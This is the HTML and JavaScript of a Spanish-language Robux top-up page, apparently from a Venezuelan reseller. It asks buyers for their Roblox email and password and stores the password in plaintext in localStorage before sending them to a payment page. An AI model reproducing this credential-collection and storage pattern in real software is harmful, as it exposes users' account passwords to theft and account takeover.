<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recargar Robux - Malok Recargas</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="shortcut icon" href="images/malok_logo.png" type="image/x-icon">
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <style>
        /* Nuevo estilo para los cuadros de entrada del formulario */
        .form-group-custom {
            margin-bottom: 20px;
        }

        .form-group-custom label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #ffffff;
        }

        .input-container {
            position: relative;
            width: 100%;
        }

        /* Corrección: aplica el estilo a los input de tipo email, password y text */
        .input-container input[type="email"],
        .input-container input[type="password"],
        .input-container input[type="text"] {
            width: 100%;
            padding: 12px 45px 12px 40px;
            font-size: 16px;
            border: 2px solid #ddd;
            border-radius: 25px;
            background-color: #f9f9f9;
            transition: border-color 0.3s, box-shadow 0.3s;
            box-sizing: border-box;
        }

        .input-container input:focus {
            outline: none;
            border-color: #007bff;
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2);
        }

        .input-container .icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #aaa;
            transition: color 0.3s;
        }

        .input-container input:focus + .icon {
            color: #007bff;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #aaa;
            transition: color 0.3s;
        }

        .toggle-password:hover {
            color: #555;
        }
    </style>
</head>
<body>
    <header>
        <div class="header-left">
            <a href="index.html" class="logo-link">
                <img src="images/malok_logo.png" alt="Malok Recargas Logo" class="logo-img">
            </a>
        </div>
        <div class="header-right">
            <div class="search-bar">
                <input type="text" placeholder="Buscar juego...">
                <i class="fas fa-search"></i>
            </div>
            <div class="custom-currency-selector" id="custom-currency-selector">
                <div class="selected-currency" id="selected-currency">
                    <img src="images/flag_ve.png" alt="Venezuela Flag"> <span>Bs. (VES)</span> <i class="fas fa-chevron-down"></i>
                </div>
                <div class="currency-options" id="currency-options">
                    <div class="option" data-value="VES">
                        <img src="images/flag_ve.png" alt="Venezuela Flag"> <span>Bs. (VES)</span>
                    </div>
                    <div class="option" data-value="USD">
                        <img src="images/flag_us.png" alt="USA Flag"> <span>$ (USD)</span>
                    </div>
                </div>
            </div>
        </div>
    </header>

    <main class="roblox-main">
        <div class="form-container">
            <img src="images/roblox_banner2.jpg" alt="Roblox Banner" class="game-banner">
            <h2>Recargar Robux</h2>
            <div class="game-info">
                <p>Moneda actual: <span id="currency-display">USD</span></p>
                <p>Ingresa tus datos de Roblox.</p>
            </div>

            <form id="roblox-recharge-form">
                <div class="form-group-custom">
                    <label for="roblox-email">1. Ingresa tu Correo de Roblox:</label>
                    <div class="input-container">
                        <i class="fas fa-envelope icon"></i>
                        <input type="email" id="roblox-email" name="robloxEmail" placeholder="ejemplo@correo.com" required>
                    </div>
                </div>
                <div class="form-group-custom">
                    <label for="roblox-password">2. Ingresa tu Contraseña de Roblox:</label>
                    <div class="input-container">
                        <i class="fas fa-lock icon"></i>
                        <input type="password" id="roblox-password" name="robloxPassword" placeholder="Ingresa tu contraseña" required>
                        <i class="fas fa-eye-slash toggle-password" id="toggle-password"></i>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>3. Selecciona tus Robux:</label>
                    <div class="package-list" id="package-list">
                    </div>
                </div>

                <button type="submit" class="btn-primary" id="confirm-recharge-btn" disabled>Confirmar Recarga</button>
            </form>
        </div>
    </main>

    <footer>
        <div class="footer-content">
            <p>&copy; 2025 Malok Recargas. Todos los derechos reservados.</p>
            <div class="footer-links">
                <a href="privacy.html">Políticas de Privacidad</a>
                <a href="terms.html">Términos de Servicio</a>
            </div>
            <a href="https://wa.me/584126949631" target="_blank" class="whatsapp-link">
                <i class="fab fa-whatsapp"></i> Contáctanos por WhatsApp
            </a>
        </div>
    </footer>

    <script src="script.js"></script>
    <script>
        // Paquetes de Robux con precios en USD y VES fijos
        const robloxPackages = [
            { id: 1, name: '40 Robux', priceUSD: 0.71, priceVES: 225.00 },
            { id: 2, name: '80 Robux', priceUSD: 1.41, priceVES: 445.00 },
            { id: 3, name: '400 Robux', priceUSD: 7.13, priceVES: 2246.00 },
            { id: 4, name: '800 Robux', priceUSD: 14.26, priceVES: 4492.00 },
            { id: 5, name: '1700 Robux', priceUSD: 28.60, priceVES: 9010.00 },
            { id: 5, name: '4500 Robux', priceUSD: 58.90, priceVES: 18554.00 }
        ];

        document.addEventListener('DOMContentLoaded', () => {
            const emailInput = document.getElementById('roblox-email');
            const passwordInput = document.getElementById('roblox-password');
            const togglePassword = document.getElementById('toggle-password');
            const packageListDiv = document.getElementById('package-list');
            const confirmBtn = document.getElementById('confirm-recharge-btn');
            const currencyDisplaySpan = document.getElementById('currency-display');
            
            let selectedPackage = null;

            // Función para mostrar/ocultar la contraseña
            if (passwordInput && togglePassword) {
                togglePassword.addEventListener('click', () => {
                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                    passwordInput.setAttribute('type', type);
                    togglePassword.classList.toggle('fa-eye');
                    togglePassword.classList.toggle('fa-eye-slash');
                });
            }

            function formatPrice(price, currency) {
                if (currency === 'VES') {
                    return `Bs. ${price.toFixed(2)}`;
                } else {
                    return `$${price.toFixed(2)}`;
                }
            }

            function updatePackages(currentCurrency) {
                currencyDisplaySpan.textContent = currentCurrency;
                packageListDiv.innerHTML = '';
                robloxPackages.forEach(pkg => {
                    let displayPrice = (currentCurrency === 'VES') ? pkg.priceVES : pkg.priceUSD;
                    const packageItem = document.createElement('div');
                    packageItem.classList.add('package-item');
                    packageItem.dataset.id = pkg.id;
                    packageItem.dataset.priceUsd = pkg.priceUSD;
                    packageItem.dataset.priceVes = pkg.priceVES;
                    packageItem.innerHTML = `
                        <span>${pkg.name}</span>
                        <span class="price">${formatPrice(displayPrice, currentCurrency)}</span>
                    `;
                    packageItem.addEventListener('click', () => {
                        if (selectedPackage) {
                            selectedPackage.classList.remove('selected');
                        }
                        packageItem.classList.add('selected');
                        selectedPackage = packageItem;
                        checkFormValidity();
                    });
                    packageListDiv.appendChild(packageItem);
                });
                checkFormValidity();
            }

            function checkFormValidity() {
                const emailValid = emailInput.value.trim() !== '';
                const passwordValid = passwordInput.value.trim() !== '';
                confirmBtn.disabled = !(emailValid && passwordValid && selectedPackage);
            }

            const initialCurrency = localStorage.getItem('selectedCurrency') || 'VES';
            updatePackages(initialCurrency);

            emailInput.addEventListener('input', checkFormValidity);
            passwordInput.addEventListener('input', checkFormValidity);

            window.addEventListener('currencyChanged', (event) => {
                const newCurrency = event.detail.currency;
                updatePackages(newCurrency);
            });

            document.getElementById('roblox-recharge-form').addEventListener('submit', (e) => {
                e.preventDefault();
                if (selectedPackage) {
                    const robloxEmail = emailInput.value.trim();
                    const robloxPassword = passwordInput.value.trim();
                    const packageName = selectedPackage.querySelector('span:first-child').textContent;
                    const basePriceUSD = parseFloat(selectedPackage.dataset.priceUsd);
                    const basePriceVES = parseFloat(selectedPackage.dataset.priceVes);
                    const selectedCurrency = localStorage.getItem('selectedCurrency') || 'VES';
                    const finalPrice = (selectedCurrency === 'VES') ? basePriceVES : basePriceUSD;
                    
                    const transactionDetails = {
                        game: "Roblox",
                        robloxEmail: robloxEmail,
                        robloxPassword: robloxPassword,
                        package: packageName,
                        priceUSD: basePriceUSD.toFixed(2),
                        finalPrice: finalPrice.toFixed(2),
                        currency: selectedCurrency
                    };

                    localStorage.setItem('transactionDetails', JSON.stringify(transactionDetails));
                    window.location.href = 'payment.html';
                } else {
                    console.error('Por favor, selecciona un plan de recarga.');
                }
            });
        });
    </script>
</body>
</html>
